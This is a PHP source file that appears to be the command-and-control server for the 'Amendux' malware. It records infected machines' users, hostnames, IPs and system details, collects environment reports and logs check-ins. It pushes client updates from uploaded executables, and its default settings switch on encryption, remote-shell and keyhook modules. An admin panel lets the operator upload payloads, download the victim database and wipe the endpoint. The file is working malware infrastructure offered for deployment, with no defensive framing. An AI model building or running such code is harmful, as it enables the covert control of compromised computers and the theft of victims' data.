<?php
/*
 * This file is part of the Amendux project.
 *
 * All rights reserved (c) 2016
 *
 * This project is not free or open software nor should
 * it be released publicly. Unauthorized copying of this
 * file, via any medium is strictly prohibited Proprietary
 * and confidential.
 *
 * INSTALL:
 *   To get started change global settings and upload
 *   this script to a (apache) server running PHP 5.1+
 *   with PDO and SQLite 2+.
 *
 * OPERATION:
 *   setup: <script.php>?setup=true
 *   admin: <script.php>?admin=true
 *
 * VERSION: 1.5.4
 */

/* Global config settings */
define("VERSION",	"1.5.4");
define("DEBUG",		true);
define("INACTIVE",	false);
define("SQL_DB",	"avc.db");
define("TMP_DIR",	"avctemp");
define("AUTH_USER",	"admin");
define("PWDSIZE",	22);

$GUIDLEN = 38;

if (DEBUG) {
	error_reporting(E_ALL);
	ini_set("display_errors", 1);
}

if (INACTIVE) {
	header("HTTP/1.1 404 Not Found");
	exit();
}

/* Try overriding defaults */
ini_set('upload_max_filesize', '100M');     
ini_set('post_max_size', '100M'); 
ini_set('max_execution_time', '1800');
ini_set('memory_limit', '128M');

/* Command codes sent by server */
$server_codes = array(
	"invalid" =>	0, /* remove? */
	"pong" =>		101,
	"ignore" =>		102,
	"update" =>		103,
	"ack" => 		900,
);

/* ************************************
 *  HELPERS
 * ************************************/

function logOke($message) {
	if (DEBUG) {
		echo "<b><font color=\"green\">[Oke] </font>" . $message . "</b><br />";
	}
}

function logWarn($message) {
	if (DEBUG) {
		echo "<b><font color=\"orange\">[Warn] </font>" . $message . "</b><br />";
	}
}

function logError($message) {
	if (DEBUG) {
		die("<b><font color=\"red\">[Error] </font>" . $message . "</b><br />");
	}
}

function deleteDirectory($path) {
	if (is_dir($path) === true) {
		$files = array_diff(scandir($path), array(".", ".."));

		foreach ($files as $file) {
			deleteDirectory(realpath($path) . "/" . $file);
		}

		return rmdir($path);
	} else if (is_file($path) === true) {
		return unlink($path);
	}

	return false;
}

function randomPassword($length = PWDSIZE, $ext = true) {
	$chars = "abcdefghijklmnopqrstuvwxyz0123456789";
	if ($ext) {
    	$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-=+;:,.?";
	}

    $password = substr(str_shuffle($chars), 0, $length);
    return $password;
}

/* We only send this error if input was not present or corrupted */
function sendResponseError() {
	header("HTTP/1.1 404 Not Found");
	exit();
}

/* Send basic auth for admin requests */
function sendBasicAuth() {
	header("WWW-Authenticate: Basic realm=\"Authentication\"");
	header("HTTP/1.0 401 Unauthorized");
	exit();
}

/* Send back REST call */
function sendResponse($obj, $code, $success = true) {
	global $server_codes;

	if (!in_array($code, $server_codes)) {
		$code = "invalid";
	}

	$array = array(
		"data" => $obj,
		"code" => $server_codes[$code],
		"success" => $success,
	);

	header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
	header('Cache-Control: post-check=0, pre-check=0', false);
	header('Pragma: no-cache');
	header('Content-type: application/json');
	echo json_encode($array);
	exit();
}

/* If the hash_equals() function does not ecist */
if (!function_exists('hash_equals')) {
	function hash_equals($str1, $str2) {
		if(strlen($str1) != strlen($str2)) {
			return false;
		} else {
			$res = $str1 ^ $str2;
			$ret = 0;
			for($i = strlen($res) - 1; $i >= 0; $i--) $ret |= ord($res[$i]);
			return !$ret;
		}
	}
}

/* ************************************
 *  SETUP PROCEDURE
 * ************************************/

/* Contains the database setup, should only be run once */
function setup() {
	/* This password is hashed using crypt() and generated pseudorandom which is not
	 * the best of ideas but since we're trying to minimize dependencies its the
	 * best we've got. Therefore length is important. */
	$masterpwd = randomPassword();
	$avcname = "AVC_" . randomPassword(5, false) . "$";

	if (!defined('PDO::ATTR_DRIVER_NAME')) {
		logError("PDO not available");
	}

	if (!in_array("sqlite", PDO::getAvailableDrivers())) {
		logError("SQLite not available");
	}

	if (!is_writable(".")) {
		logError("Current directory not writable");
	}

	logOke("Minimum requirements passed");

	if (!file_exists(TMP_DIR)) {
		if (!mkdir(TMP_DIR)) {
	    	logError("Creating temp folder");
		}

		if (!mkdir(TMP_DIR . "/bin")) {
			logError("Creating temp folders");
		}

		if (!mkdir(TMP_DIR . "/var")) {
			logError("Creating temp folders");
		}

		if (!mkdir(TMP_DIR . "/etc")) {
			logError("Creating temp folders");
		}

		if (!mkdir(TMP_DIR . "/cache")) {
			logError("Creating temp folders");
		}

		logOke("Creating directories");

		$htaccess  = "Options -Indexes\n";
		$htaccess .= "Deny from all\n";
		$htaccess .= "Require all denied\n";

		file_put_contents(TMP_DIR . "/var/.htaccess", $htaccess);
		file_put_contents(TMP_DIR . "/etc/.htaccess", $htaccess);
		file_put_contents(TMP_DIR . "/cache/.htaccess", $htaccess);

		$htaccess  = "Options -Indexes\n";
		$htaccess .= "<Files \"*.db\">\n";
		$htaccess .= "Deny from all\n";
		$htaccess .= "Require all denied\n";
		$htaccess .= "</Files>\n";

		file_put_contents(TMP_DIR . "/.htaccess", $htaccess);

		logOke("Creating server settings");
	} else {
		logError("Setup already present");
	}

	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$db->exec(
			"CREATE TABLE instances (
				guid				TEXT,
				name				TEXT,
				remote				TEXT,
				user				TEXT,
				machine_name		TEXT,
				cpu_cores			INTEGER,
				max_memory			INTEGER,
				os_version			TEXT,
				client_version		INTEGER,
				has_superuser		INTEGER,
				encrypt_pubkey		TEXT,
				encrypt_privkey		TEXT,
				first_appearance	TEXT,
				last_update			TEXT,
				PRIMARY KEY(guid)
			)");

		$db->exec(
			"CREATE TABLE checkin (
				guid		TEXT,
				timestamp	TEXT,
				FOREIGN KEY(guid) REFERENCES instances(guid)
			)");

		$db->exec(
			"CREATE TABLE settings (
				key		TEXT,
				value	TEXT,
				PRIMARY KEY(key)
			)");

		$db->exec(
			"CREATE TABLE tasks (
				id		INTEGER PRIMARY KEY AUTOINCREMENT,
				guid	TEXT,
				task	TEXT,
				FOREIGN KEY(guid) REFERENCES instances(guid)
			)");

		logOke("Creating database");

		$db->exec("INSERT INTO settings (key, value) VALUES ('setup', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('avc_name', '" . $avcname . "')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('masterpwd', '" . crypt($masterpwd, randomPassword(32)) ."')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('allow_eliminate', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('client_update', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('client_version', '')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('url', '" . $_SERVER['HTTP_HOST'] . "')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('update_url', 'http://" . $_SERVER['HTTP_HOST'] . "/" . TMP_DIR . "/bin/update_xyz.exe')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('ftp_host', 'ftp://" . $_SERVER['HTTP_HOST'] . "')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('ftp_username', '')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('ftp_password', '')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_encrypt', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_shell', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_keyhook', 'true')");
		$db->exec("INSERT INTO settings (key, value) VALUES ('mod_compile', 'false')");

		$db = NULL;
		logOke("Create default settings");
	} catch(PDOException $e) {
		logError("Creating tables: " . $e->getMessage());
	}

	logOke("AVC name: " . $avcname);
	logOke("Masterpassword: " . $masterpwd);
}

/* ************************************
 *  REST INTERFACE
 * ************************************/

function avc_name() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT value FROM settings WHERE key='avc_name'";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			$db = NULL;
			return $row[0];
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Getting AVC name: " . $e->getMessage());
	}
}

function saveNewInstance(Array $data) {
	if (!isset($data[":guid"])) {
		sendResponseError();
	}

	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$selectSql = "SELECT 1 FROM instances WHERE guid=:guid";

		$stmt = $db->prepare($selectSql);
		$stmt->execute(Array(":guid" => $data[":guid"]));
		
		if ($stmt->fetch()) {
			$updateSql = "UPDATE instances
						SET last_update=datetime('now'), remote=:remote, user=:user, machine_name=:machine_name, cpu_cores=:cpu_cores, max_memory=:max_memory, os_version=:os_version, client_version=:client_version
						WHERE guid=:guid";

			$stmt = $db->prepare($updateSql);
			$stmt->execute($data);
		} else {
			$insertSql = "INSERT INTO instances (first_appearance, last_update, guid, remote, user, machine_name, cpu_cores, max_memory, os_version, client_version)
						VALUES
						(datetime('now'), datetime('now'), :guid, :remote, :user, :machine_name, :cpu_cores, :max_memory, :os_version, :client_version)";

			$stmt = $db->prepare($insertSql);
			$stmt->execute($data);
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Saving: " . $e->getMessage());
	}
}

function saveNewCheckin(Array $data) {
	if (!isset($data[":guid"])) {
		sendResponseError();
	}

	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$insertSql = "INSERT INTO checkin (guid, timestamp)
					VALUES
					(:guid, datetime('now'))";

		$stmt = $db->prepare($insertSql);
		$stmt->execute($data);

		$db = NULL;
	} catch(PDOException $e) {
		logError("Saving: " . $e->getMessage());
	}
}

function saveSetting($key, $value) {
	if (!isset($key)) {
		sendResponseError();
	}

	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$selectSql = "SELECT value FROM settings WHERE key=:key";

		$stmt = $db->prepare($selectSql);
		$stmt->execute(Array(":key" => $key));

		if ($stmt->fetch()) {
			$updateSql = "UPDATE settings
						SET value=:value
						WHERE key=:key";

			$stmt = $db->prepare($updateSql);
			$stmt->execute(Array(":key" => $key, ":value" => $value));
		} else {
			$insertSql = "INSERT INTO settings (key, value)
						VALUES
						(:key, :value)";

			$stmt = $db->prepare($insertSql);
			$stmt->execute(Array(":key" => $key, ":value" => $value));
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Saving: " . $e->getMessage());
	}
}

function authenticateUser() {
	if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) {
		sendBasicAuth();
	}

	if ($_SERVER['PHP_AUTH_USER'] != AUTH_USER) {
		return false;
	}

	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT value FROM settings WHERE key='masterpwd'";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {

			if (hash_equals($row[0], crypt($_SERVER['PHP_AUTH_PW'], $row[0]))) {
				$db = NULL;
				return true;
			}
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Authenticating: " . $e->getMessage());
	}

	sendBasicAuth();
}

function isUpdateEnabled() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT value FROM settings WHERE key='client_update'";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			if ($row[0] == 'true') {
				$db = NULL;
				return true;
			}
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Getting update: " . $e->getMessage());
	}
}

function latestClientVersion() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT value FROM settings WHERE key='client_version'";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			$db = NULL;
			return $row[0];
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Getting last version: " . $e->getMessage());
	}
}

function updateLocation() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT value FROM settings WHERE key='update_url'";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			$db = NULL;
			return $row[0];
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Getting update location: " . $e->getMessage());
	}
}

function countInstances() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT count('*') FROM instances";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			$db = NULL;
			return $row[0];
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Getting instance count: " . $e->getMessage());
	}
}

function countCheckins() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT count('*') FROM checkin";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		if ($row = $stmt->fetch()) {
			$db = NULL;
			return $row[0];
		}

		$db = NULL;
	} catch(PDOException $e) {
		logError("Getting checkin count: " . $e->getMessage());
	}
}

function listInstances() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT * FROM instances";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		$obj = Array();
		while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($obj, $row);
		}

		$db = NULL;
		return $obj;
	} catch(PDOException $e) {
		logError("Listing instances: " . $e->getMessage());
	}
}

function listCheckins() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT * FROM checkin";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		$obj = Array();
		while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
			array_push($obj, $row);
		}

		$db = NULL;
		return $obj;
	} catch(PDOException $e) {
		logError("Listing checkings: " . $e->getMessage());
	}
}

function listSettings() {
	try {
		$db = new PDO("sqlite:" . TMP_DIR . "/" . SQL_DB);
		$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

		$sql = "SELECT * FROM settings";

		$stmt = $db->prepare($sql);
		$stmt->execute();
		
		$obj = Array();
		while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
			// array_push($obj, $row);
			$obj[$row["key"]] = $row["value"];
		}

		$db = NULL;
		return $obj;
	} catch(PDOException $e) {
		logError("Listing settings: " . $e->getMessage());
	}
}

function handleSolicit(stdClass $data) {
	if (!property_exists($data, 'guid')) {
		sendResponseError();
	}

	if (strlen($data->guid) != $GUIDLEN) {
		sendResponseError();
	}

	$db_bind = array(":guid" => $data->guid, ":remote" => $_SERVER['REMOTE_ADDR']);

	if (property_exists($data, 'user')) {
		$db_bind[":user"] = $data->user;
	}

	if (property_exists($data, 'computer')) {
		$db_bind[":machine_name"] = $data->computer;
	}

	if (property_exists($data, 'corenum')) {
		$db_bind[":cpu_cores"] = $data->corenum;
	}

	if (property_exists($data, 'maxmem')) {
		$db_bind[":max_memory"] = $data->maxmem;
	}

	if (property_exists($data, 'winver')) {
		$db_bind[":os_version"] = $data->winver;
	}

	if (property_exists($data, 'cliver')) {
		$db_bind[":client_version"] = $data->cliver;
	}

	saveNewInstance($db_bind);

	if (property_exists($data, 'env')) {
		$report = json_encode($data->env, JSON_PRETTY_PRINT);

		$file = TMP_DIR . "/cache/" . $data->guid . ".txt";
		file_put_contents($file, $report);
	}
}

function handleCheckin(stdClass $data) {
	if (!property_exists($data, 'guid')) {
		sendResponseError();
	}

	if (strlen($data->guid) != $GUIDLEN) {
		sendResponseError();
	}

	$db_bind = array(":guid" => $data->guid);

	saveNewCheckin($db_bind);
}

function handleUpdateCheck(stdClass $data) {
	if (!property_exists($data, 'build')) {
		sendResponseError();
	}

	if (isUpdateEnabled()) {
		$build = latestClientVersion();
		if ($build) {
			if ($build > $data->build) {
				$obj["build"] = intval($build);
				$obj["url"] = updateLocation();

				sendResponse($obj, "update");
			}
		}
	}

	sendResponse(null, "ignore");
}

function handleAdminInformationRequest() {
	$obj["setup"] = true;
	$obj["name"] = avc_name();
	$obj["instances"] = intval(countInstances());
	$obj["checkins"] = intval(countCheckins());

	sendResponse($obj, "ack");
}

function handleAdminInstances() {
	sendResponse(listInstances(), "ack");
}

function handleAdminCheckins() {
	sendResponse(listCheckins(), "ack");
}

function handleAdminSettings(stdClass $data = null) {
	if (!empty($data)) {
		foreach($data as $key => $value) {
    		saveSetting($key, $value);
		}
	}

	sendResponse(listSettings(), "ack");
}

function handleAdminPasswordChange(stdClass $data) {
	if (!property_exists($data, "password")) {
		sendResponseError();
	}

	if (strlen($data->password) < PWDSIZE) {
		sendResponseError();
	}

	saveSetting("masterpwd", crypt($data->password, randomPassword(32)));

	sendResponse(null, "ack");
}

/* REST router */
function handleRestRequest() {
	if ($_SERVER['REQUEST_METHOD'] == "POST" && !empty($_POST["data"])) {
		$object = json_decode($_POST["data"]);
		if (!is_object($object)) {
			sendResponseError();
		}

		if (!property_exists($object, "code")) {
			sendResponseError();
		}

		if (!property_exists($object, "success")) {
			sendResponseError();
		}

		if (property_exists($object, "data")) {
			if (!is_object($object->data) && !is_null($object->data)) {
				sendResponseError();
			}
		}

		switch ($object->code) {
			/* Client sends ping */
			case 101:
				sendResponse(null, "pong");
				break;

			/* Client sends solicit */
			case 200:
				if (empty($object->data)) {
					sendResponseError();
				}

				handleSolicit($object->data);
				sendResponse(null, "ack"); // move to mode
				break;

			/* Client sends checkin */
			case 201:
				if (empty($object->data)) {
					sendResponseError();
				}

				handleCheckin($object->data);
				sendResponse(null, "ack"); // move to mode
				break;

			/* Client sends update */
			case 202:
				if (empty($object->data)) {
					sendResponseError();
				}

				handleUpdateCheck($object->data);
				break;

			/* Client sends eliminate */
			case 299:
				// sendResponse(null, "pong");
				break;


			/* ***********************
			 * Admin console commands
			 * ***********************/

			/* Client request for AVC status */
			case 700:
				if (!authenticateUser()) {
					sendResponseError();
				}

				handleAdminInformationRequest();
				break;

			/* Client request for instances */
			case 701:
				if (!authenticateUser()) {
					sendResponseError();
				}

				handleAdminInstances();
				break;

			/* Client request for checkins */
			case 702:
				if (!authenticateUser()) {
					sendResponseError();
				}

				handleAdminCheckins();
				break;

			/* Client request for settings */
			case 703:
				if (!authenticateUser()) {
					sendResponseError();
				}

				handleAdminSettings($object->data);
				break;

			/* Client sends new password */
			case 704:
				if (!authenticateUser()) {
					sendResponseError();
				}

				if (empty($object->data)) {
					sendResponseError();
				}

				handleAdminPasswordChange($object->data);
				break;

			default:
				sendResponseError();
		}
	} else {
		sendResponseError();
	}
}

/* ************************************
 *  ADMIN INTERFACE
 * ************************************/

function handleAdminRequest() {
	if (authenticateUser()) {

		/* Download database */
		if (isset($_GET["downloaddb"]) && $_GET["downloaddb"] == "true") {
			header('Content-Description: File Transfer');
			header('Content-Type: application/octet-stream');
			header('Content-Disposition: attachment; filename="'.basename(SQL_DB).'"');
			header('Expires: 0');
			header('Cache-Control: must-revalidate');
			header('Pragma: public');
			header('Content-Length: ' . filesize(TMP_DIR . "/" . SQL_DB));
			readfile(TMP_DIR . "/" . SQL_DB);
			exit();
		}

		/* Purge entire endpoint. This deletes everything including source
		 * files, uploads and the database.
		 */
		if (isset($_GET["purge"]) && $_GET["purge"] == "true") {
			deleteDirectory(TMP_DIR);
			unlink(basename(__FILE__));
			logOke("Endpoint and data purged");
			exit();
		}

		/* Upload new file */
		if (isset($_GET["upload"]) && $_GET["upload"] == "true") {
			if (isset($_FILES["file"])) {
				$file_name = $_FILES['file']['name'];
				$file_tmp = $_FILES['file']['tmp_name'];
				$file_size = $_FILES['file']['size'];

				if (isset($_POST['filename']) && strlen($_POST['filename']) > 0) {
					$file_name = $_POST['filename'];
				}

				if (!$file_size) {
					logWarn("File is empty");

					echo "<br /><a href=\"?admin=true\"><< Back</a>";
					exit();
				}

				move_uploaded_file($file_tmp, TMP_DIR . "/bin/" . $file_name);
				logOke("File uploaded to bin directory");
				logOke("Access through: <a href=\"" . TMP_DIR . "/bin/" . $file_name . "\">" . TMP_DIR . "/bin/" . $file_name . "</a>");

				echo "<br /><a href=\"?admin=true\"><< Back</a>";
				exit();
			}

			logWarn("File not uploaded");

			echo "<br /><a href=\"?admin=true\"><< Back</a>";
			exit();
		}

		/* Delete file from upload directory */
		if (isset($_GET["deleteupload"]) && $_GET["deleteupload"] == "true" && isset($_GET["file"])) {
			if (@unlink(TMP_DIR . "/bin/" . $_GET["file"]))
				logOke("File removed");
			else
				logWarn("File not removed or does not exist");

			echo "<br /><a href=\"?admin=true\"><< Back</a>";
			exit();
		}

		/* Show PHP info */
		if (isset($_GET["phpinfo"]) && $_GET["phpinfo"] == "true") {
			phpinfo();
			exit();
		}

		// Add custom admin operations here

		/* Disable all caching */
		header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
		header("Cache-Control: post-check=0, pre-check=0", false);
		header("Pragma: no-cache");

		/* Admin view interface */
		logOke("Version: " . VERSION);
		logOke("Login: " . htmlspecialchars($_SERVER['PHP_AUTH_USER']));
		logOke("Name: " . avc_name());
		logOke("Instances: " . countInstances());
		logOke("Checkins: " . countCheckins());
		echo "<br /><br />Download database:<br /><button onclick=\"window.open('?admin=true&downloaddb=true');\">Download database</button>\n";
		echo "<br /><br />Purge AVC endpoint:<br /><button onclick=\"if (confirm('Purge this endpoint including data?')){ window.location.href = '?admin=true&purge=true'; }else{ false; }\">Eliminate endpoint</button>\n";
		echo "<br /><br />Upload file:<br /><form action=\"?admin=true&upload=true\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"text\" name=\"filename\" placeholder=\"Optional filename\" /><br /><input type=\"file\" name=\"file\" /><br /><input type=\"submit\" value=\"Upload\"/></form>\n";
		echo "<br />Other:<br /><button onclick=\"window.open('?admin=true&phpinfo=true');\">PHP Info</button>\n";
		echo "<br /><br />Directory listing:<br /><ul>\n";

		foreach (scandir(TMP_DIR . "/bin/") as $item) {
			if ($item == "." || $item == "..")
				continue;
			echo "<li><a href=" . TMP_DIR . "/bin/" . $item . ">" . $item . "</a> (<a href=\"?admin=true&deleteupload=true&file=" . $item . "\">delete</a>)</li>\n";
		}

		echo "</ul>\n";

		// Add custom HTML here
	}
}

/* ************************************
 *  REQUEST HANDLERS
 * ************************************/

/* Call setup procedure */
if (isset($_GET["setup"]) && $_GET["setup"] == "true") {
	setup();
	exit();
}

/* Admin interface */
if (isset($_GET["admin"]) && $_GET["admin"] == "true") {
	handleAdminRequest();
	exit();
}

/* Handle incomming REST requests */
handleRestRequest();

?>
